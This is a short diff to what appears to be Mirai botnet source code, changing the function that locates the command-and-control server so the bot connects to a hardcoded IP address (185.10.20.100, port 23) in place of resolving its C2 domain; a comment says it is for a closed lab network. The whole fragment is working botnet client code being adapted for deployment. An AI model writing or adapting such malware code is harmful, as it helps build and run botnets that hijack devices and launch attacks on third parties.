@@ -358,27 +358,15 @@ static void anti_gdb_entry(int sig)
 
 static void resolve_cnc_addr(void)
 {
-    struct resolv_entries *entries;
-
-    table_unlock_val(TABLE_CNC_DOMAIN);
-    entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));
-    table_lock_val(TABLE_CNC_DOMAIN);
-    if (entries == NULL)
-    {
-#ifdef DEBUG
-        printf("[main] Failed to resolve CNC address\n");
-#endif
-        return;
-    }
-    srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
-    resolv_entries_free(entries);
+    /* Lab: connect to C2 by IP (closed network — no DNS / no cnc.lab). */
+    srv_addr.sin_addr.s_addr = INET_ADDR(185, 10, 20, 100);
 
     table_unlock_val(TABLE_CNC_PORT);
     srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
     table_lock_val(TABLE_CNC_PORT);
 
 #ifdef DEBUG
-    printf("[main] Resolved domain\n");
+    printf("[main] CNC hardcode 185.10.20.100:23\n");
 #endif
 }
 
